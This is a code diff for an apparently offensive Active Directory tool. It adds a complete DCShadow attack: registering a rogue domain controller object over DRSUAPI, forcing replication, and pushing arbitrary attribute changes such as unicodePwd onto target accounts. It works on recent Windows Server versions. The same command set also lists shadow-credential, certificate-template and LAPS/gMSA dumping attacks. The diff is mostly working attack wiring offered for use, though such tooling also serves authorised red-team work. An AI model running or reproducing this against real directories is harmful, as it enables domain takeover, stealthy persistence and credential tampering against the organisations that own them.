@@ -244,25 +244,65 @@ enum AttackCmd {
     /// Shadow Credentials — thin alias over `attack abuse --action add-keycred` / `pkinit`.
     Shadowcred(attacks::shadowcred::ShadowcredArgs),
     /// DCShadow — default: enumerate DCSync-capable principals. `--prep <name>` registers a rogue
-    /// nTDSDSA under Configuration NC (phase 1 of the Le Toux DCShadow chain); `--cleanup <name>`
-    /// removes it. Full push (phase 2) is not yet implemented.
-    Dcshadow(DcshadowArgs),
+    /// nTDSDSA (LDAP path, ≤ Server 2016 only) or `--drsuapi --prep <name>` (DRSUAPI path, works
+    /// on 2019+). `--cleanup <name>` removes it (works on any version). `--drsuapi --push` fires
+    /// the full DCShadow modify against a target object.
+    Dcshadow(Box<DcshadowArgs>),
 }
 
 #[derive(Parser)]
 struct DcshadowArgs {
     #[command(flatten)]
     scan: attacks::scan::ScanArgs,
-    /// Register a rogue nTDSDSA with this CN (phase 1). Idempotent: rerunning with the same
-    /// name after a partial failure is safe. Requires Domain Admin or Configuration NC write.
+    /// Register a rogue nTDSDSA with this CN. Without `--drsuapi` this uses the LDAP path
+    /// (dead on Server 2019+ per system-owned attribute hardening — ≤ 2016 only). With
+    /// `--drsuapi` it uses `IDL_DRSAddEntry` (opnum 17), which works on 2019/2022/2025.
+    /// Idempotent: rerunning with the same name after a partial failure is safe.
     #[arg(long)]
     prep: Option<String>,
-    /// Remove a rogue nTDSDSA previously created with --prep. NoSuchObject is swallowed.
+    /// Remove a rogue nTDSDSA previously created with `--prep`. Uses LDAP delete, which
+    /// works on any Server version (the 2019+ hardening only blocks *adds* of system-owned
+    /// attributes, not deletes of objects we already own). NoSuchObject is swallowed.
     #[arg(long)]
     cleanup: Option<String>,
     /// AD site name for --prep / --cleanup [default: Default-First-Site-Name].
     #[arg(long, default_value = "Default-First-Site-Name")]
     site: String,
+    /// Use the DRSUAPI code path (works on Server 2019/2022/2025). Combines with `--prep`
+    /// (registers the rogue nTDSDSA via `IDL_DRSAddEntry`) and `--push` (fires the full
+    /// modification via `IDL_DRSReplicaAdd` + a second `IDL_DRSAddEntry`).
+    #[arg(long)]
+    drsuapi: bool,
+    /// Fire the full DCShadow push: schedule a replication link from the rogue DSA, then
+    /// AddEntry a modification against `--target`. Requires `--drsuapi`, `--target`, `--attr`,
+    /// `--value`, and `--rogue-dsa` (the DNS name of the rogue DSA registered by a prior
+    /// `--drsuapi --prep`).
+    #[arg(long)]
+    push: bool,
+    /// DRSUAPI target host (DNS name or IP of the DC). Required when `--drsuapi` is set.
+    #[arg(long)]
+    drs_host: Option<String>,
+    /// DRSUAPI NetBIOS domain (e.g. `TESTLAB`). Required when `--drsuapi` is set.
+    #[arg(long)]
+    drs_domain: Option<String>,
+    /// DN of the object to modify (push only). Example: `CN=lowuser,CN=Users,DC=testlab,DC=local`.
+    #[arg(long)]
+    target: Option<String>,
+    /// DRSUAPI ATTRTYP of the attribute to modify (push only). Common values:
+    /// 0x000d (description), 0x000e (displayName), 0x0009_005a (unicodePwd).
+    #[arg(long)]
+    attr: Option<String>,
+    /// Raw value to set (push only). Encoded UTF-8 for string attributes; use `--value-hex`
+    /// for binary values.
+    #[arg(long)]
+    value: Option<String>,
+    /// Hex-encoded raw value (push only). Alternative to `--value` for binary attributes.
+    #[arg(long)]
+    value_hex: Option<String>,
+    /// DNS name of the rogue DSA registered by a prior `--drsuapi --prep` (push only).
+    /// The target DC will pull replication from this address.
+    #[arg(long)]
+    rogue_dsa: Option<String>,
 }
 
 // PthArgs moved to attacks::ptt in arch-0.
@@ -487,7 +527,7 @@ async fn dispatch(cmd: Command) -> Result<()> {
         Command::Attack(AttackCmd::Badsuccessor(a)) => attacks::badsuccessor::badsuccessor(a).await,
         Command::Attack(AttackCmd::Esc4(a)) => attacks::esc4::esc4(a).await,
         Command::Attack(AttackCmd::Shadowcred(a)) => attacks::shadowcred::shadowcred(a).await,
-        Command::Attack(AttackCmd::Dcshadow(a)) => dcshadow(a).await,
+        Command::Attack(AttackCmd::Dcshadow(a)) => dcshadow(*a).await,
         Command::Check(CheckCmd::Adcs(a)) => checks::adcs::check_adcs(a).await,
         Command::Dump(DumpCmd::Laps(a)) => dumps::laps::dump_laps(a).await,
         Command::Dump(DumpCmd::Gmsa(a)) => dumps::gmsa::dump_gmsa(a).await,
@@ -744,16 +784,62 @@ pub(crate) fn parse_managed_password_blob(b: &[u8]) -> Option<Vec<u8>> {
 /// `attack dcshadow` — enumerate accounts that already hold DCSync replication rights
 /// (Replicating Directory Changes All / In Filtered Set / Get Changes). Every principal on
 /// this list can already dump secrets — and every non-Tier-0 principal on it is a straight
-/// path to Domain Admin. Full DCShadow *push* (register a rogue nTDSDSA + trigger DrsReplicaAdd)
-/// is not implemented — building it without a live 2016+/2019+/2022+/2025 matrix would ship
-/// blind protocol code. Once the matrix is up, this command grows the push side.
-async fn dcshadow(a: DcshadowArgs) -> Result<()> {
-    // Prep / cleanup take precedence over the detector; they mutate the target.
+/// path to Domain Admin.
+///
+/// Prep / cleanup register (and remove) a rogue nTDSDSA object; `--drsuapi --push` fires the
+/// full DCShadow modification against a target object via `IDL_DRSReplicaAdd` +
+/// `IDL_DRSAddEntry` (WS-2 1.4.1). The LDAP-path prep is kept as a fallback for
+/// ≤ Server 2016 forests — dead on 2019+ per the system-owned attribute hardening.
+async fn dcshadow(mut a: DcshadowArgs) -> Result<()> {
+    // Resolve secrets once (LDAP bind + DRSUAPI bind share the same password).
+    a.scan.auth.password = resolve_secret(&a.scan.auth.password, "ADHAMMER_PASSWORD")?;
+
+    // --drsuapi --push takes precedence: full modify against a target object.
+    if a.drsuapi && a.push {
+        let drs = build_drs_auth(&a)?;
+        let target = a
+            .target
+            .as_deref()
+            .ok_or_else(|| anyhow::anyhow!("--push requires --target <DN>"))?;
+        let rogue_dsa = a
+            .rogue_dsa
+            .as_deref()
+            .ok_or_else(|| anyhow::anyhow!("--push requires --rogue-dsa <dns-name>"))?;
+        let attr_typ = parse_attr_typ(&a)?;
+        let value = parse_push_value(&a)?;
+
+        // Derive the target NC from the target DN: the DC=… suffix.
+        let dst_nc = target
+            .split(',')
+            .filter(|c| c.trim_start().to_ascii_lowercase().starts_with("dc="))
+            .collect::<Vec<_>>()
+            .join(",");
+        if dst_nc.is_empty() {
+            anyhow::bail!("--target must contain at least one DC= component to derive the NC");
+        }
+
+        dcshadow::drsuapi_push(&drs, &dst_nc, rogue_dsa, target, attr_typ, value).await?;
+        println!(
+            "[+] DCShadow push landed: {target} attr=0x{attr_typ:08x} via rogue DSA {rogue_dsa}"
+        );
+        println!("    Verify: read the attribute back (e.g. `Get-ADUser -Filter …`) on the DC");
+        return Ok(());
+    }
+
+    // Prep — LDAP path by default; --drsuapi flips to IDL_DRSAddEntry.
     if let Some(name) = a.prep.as_deref() {
         use adhammer_collector::Collector;
         let mut coll = Collector::connect(&attacks::scan::config(&a.scan)).await?;
-        let dns = dcshadow::prep(&mut coll, name, &a.site).await?;
-        println!("[+] DCShadow prep registered rogue nTDSDSA");
+        let (dns, path) = if a.drsuapi {
+            let drs = build_drs_auth(&a)?;
+            (
+                dcshadow::drsuapi_prep(&mut coll, &drs, name, &a.site).await?,
+                "DRSUAPI (IDL_DRSAddEntry opnum 17)",
+            )
+        } else {
+            (dcshadow::prep(&mut coll, name, &a.site).await?, "LDAP (≤2016)")
+        };
+        println!("[+] DCShadow prep registered rogue nTDSDSA via {path}");
         println!("    Server : {}", dns.server_dn);
         println!("    NTDS   : {}", dns.ntds_dn);
         println!();
@@ -804,6 +890,57 @@ async fn dcshadow(a: DcshadowArgs) -> Result<()> {
         println!("as any of them dumps the whole domain without a lateral move.");
     }
     Ok(())
+}
+
+// DCShadow --drsuapi helpers.
+
+/// Build a `DrsAuth` from the DcshadowArgs. `--drs-host` and `--drs-domain` are
+/// required in DRSUAPI mode; `user` and `password` come from the LDAP auth block
+/// (same credentials for both bindings, which is the DCShadow-usual case: DA).
+fn build_drs_auth(a: &DcshadowArgs) -> Result<dcshadow::DrsAuth> {
+    let host = a
+        .drs_host
+        .as_deref()
+        .ok_or_else(|| anyhow::anyhow!("--drsuapi requires --drs-host <dns-name-or-ip>"))?;
+    let domain = a
+        .drs_domain
+        .as_deref()
+        .ok_or_else(|| anyhow::anyhow!("--drsuapi requires --drs-domain <NETBIOS>"))?;
+    Ok(dcshadow::DrsAuth {
+        host: host.to_string(),
+        domain: domain.to_string(),
+        user: a.scan.auth.user.clone(),
+        password: a.scan.auth.password.clone(),
+    })
+}
+
+/// Parse `--attr` — accepts decimal or hex (`0x…`) as a raw ATTRTYP.
+fn parse_attr_typ(a: &DcshadowArgs) -> Result<u32> {
+    let s = a
+        .attr
+        .as_deref()
+        .ok_or_else(|| anyhow::anyhow!("--push requires --attr <ATTRTYP>"))?;
+    let s = s.trim();
+    let n = if let Some(hex) = s.strip_prefix("0x").or_else(|| s.strip_prefix("0X")) {
+        u32::from_str_radix(hex, 16)
+    } else {
+        s.parse::<u32>()
+    };
+    n.map_err(|_| anyhow::anyhow!("--attr must be an integer or 0x-hex ATTRTYP, got {s:?}"))
+}
+
+/// Parse `--value` or `--value-hex`. Exactly one must be set.
+fn parse_push_value(a: &DcshadowArgs) -> Result<Vec<u8>> {
+    match (a.value.as_deref(), a.value_hex.as_deref()) {
+        (Some(_), Some(_)) => {
+            anyhow::bail!("pass either --value or --value-hex, not both")
+        }
+        (Some(v), None) => Ok(v.as_bytes().to_vec()),
+        (None, Some(h)) => {
+            hex::decode(h.trim()).map_err(|e| anyhow::anyhow!("--value-hex parse: {e}"))
+        }
+        (None, None) => anyhow::bail!("--push requires --value <text> or --value-hex <bytes>"),
+    }
 }
 
 // fn check_adcs moved to `checks::adcs` in arch-0.
